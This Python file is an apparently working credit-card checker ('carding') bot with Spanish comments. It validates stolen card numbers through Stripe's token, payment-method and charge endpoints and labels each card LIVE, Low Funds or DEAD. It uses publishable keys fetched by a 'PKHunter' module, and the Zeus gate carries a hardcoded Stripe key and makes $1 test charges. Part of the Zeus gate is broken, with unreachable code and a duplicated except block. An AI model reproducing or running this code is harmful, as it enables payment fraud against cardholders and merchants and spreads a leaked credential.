import requests
import json
from pk_hunter import PKHunter
import os

class BinLookup:
    """SISTEMA DE INTELIGENCIA DE BINS"""
    @staticmethod
    def get_info(bin_code):
        try:
            # API de alta velocidad para obtener nivel y país del BIN
            r = requests.get(f"https://lookup.binlist.net/{bin_code[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get("scheme", "VISA/MC").upper(),
                    "type": data.get("type", "CREDIT/DEBIT").upper(),
                    "level": data.get("brand", "STANDARD").upper(),
                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                    "country": data.get("country", {}).get("name", "Unknown"),
                    "flag": data.get("country", {}).get("emoji", "🌐")
                }
        except:
            pass
        # Retorno de emergencia para no detener el bot
        return {"brand": "VISA/MC", "type": "CREDIT", "level": "PREMIUM", 
                "bank": "Generic Bank", "country": "US", "flag": "🇺🇸"}

class RiskAnalyzer:
    """ANALIZADOR DE SEGURIDAD DE LA CONEXIÓN"""
    @staticmethod
    def get_risk_report(response_json):
        outcome = response_json.get('outcome', {})
        risk_level = outcome.get('risk_level', 'normal')
        if risk_level == 'highest': return "🔴 RIESGO ALTO (Proxy Quemado)"
        if risk_level == 'elevated': return "🟡 RIESGO MEDIO (IP Sospechosa)"
        return "🟢 RIESGO BAJO (Conexión Limpia)"

class CCChecker:
    """COMANDO /chk - GATE STRIPE REAL"""
    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        pk = PKHunter.get_fresh_pk()
        payload = {
            'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        try:
            r = requests.post('https://api.stripe.com/v1/tokens', data=payload, timeout=15)
            res = r.json()
            res_text = str(res).lower()
            
            if "id" in res and '"cvc_check": "pass"' in res_text:
                return {"status": "LIVE ✅", "msg": "CVC2 Match", "raw": res}
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            else:
                err = res.get('error', {}).get('message', 'Declined')
                return {"status": "DEAD ❌", "msg": err, "raw": res}
        except:
            return {"status": "ERROR ⚠️", "msg": "Timeout", "raw": {}}

class ChaosGate:
    """COMANDO /chaos - GATE CHAOS V2"""
    @staticmethod
    def check_chaos(cc, mm, yy, cvv):
        pk = PKHunter.get_fresh_pk()
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU OS 16_0 like Mac OS X)'}
        payload = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        try:
            r = requests.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=headers, timeout=15)
            res = r.json()
            res_text = str(res).lower()
            
            if 'cvc_check": "pass"' in res_text or '"status": "succeeded"' in res_text:
                return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            else:
                err = res.get('error', {}).get('message', 'Generic Decline')
                return {"status": "DEAD ❌", "msg": err, "raw": res}
        except:
            return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}

import requests

class ZeusGate:
    """
    ⚡ ZEUS GATEWAY - OMNIPOTENTE V4 (ESTÉTICA PREMIUM) ⚡
    """
    @staticmethod
    def check_zeus(cc, mm, yy, cvv):
        # Llave directa para saltar errores de Render temporalmente
        sk = "rk_test_51Shy26APuGnFVpIF0dFGeX0wSWICM14VBgDkUcbFL6mz1nsHD1KykeYmF72Rk18yba5kjzwOIz6SyuCi1niU1eVC00rirH1GPJ"
        
        try:
            # --- FASE 1: TOKENIZACIÓN ---
            r_tok = requests.post(
                'https://api.stripe.com/v1/tokens',
                data={'card[number]':cc, 'card[cvc]':cvv, 'card[exp_month]':mm, 'card[exp_year]':yy},
                auth=(sk, ''), timeout=15
            )
            res_tok = r_tok.json()
            
            if "error" in res_tok:
                # Si Stripe dice que la API es inválida aquí, es que la llave rk_test fue desactivada
                return {"status": "DEAD ❌", "msg": f"Stripe Auth: {res_tok['error'].get('message')}"}

            tok_id = res_tok.get('id')

            # --- FASE 2: CARGO SEGURO ---
            r_ch = requests.post(
                'https://api.stripe.com/v1/charges',
                data={'amount': 100, 'currency': 'usd', 'source': tok_id},
                auth=(sk, ''), timeout=15
            )
            res_ch = r_ch.json()

            if res_ch.get('paid'):
                return {"status": "LIVE ✅ (Charged $1)", "msg": "Success"}
            else:
                err = res_ch.get('error', {}).get('message', 'Declined')
                return {"status": "DEAD ❌", "msg": err}

        except Exception as e:
            return {"status": "ERROR ⚠️", "msg": f"System: {str(e)}"}
            # 3. FILTRADO DE RESULTADOS REALES
            if res_ch.get('paid'):
                return {"status": "LIVE ✅ (Charged $1)", "msg": "Transaction Success"}
            elif "insufficient_funds" in str(res_ch).lower():
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds"}
            else:
                err = res_ch.get('error', {}).get('message', 'Declined')
                return {"status": "DEAD ❌", "msg": err}

        except Exception as e:
            return {"status": "ERROR ⚠️", "msg": f"System: {str(e)}"}
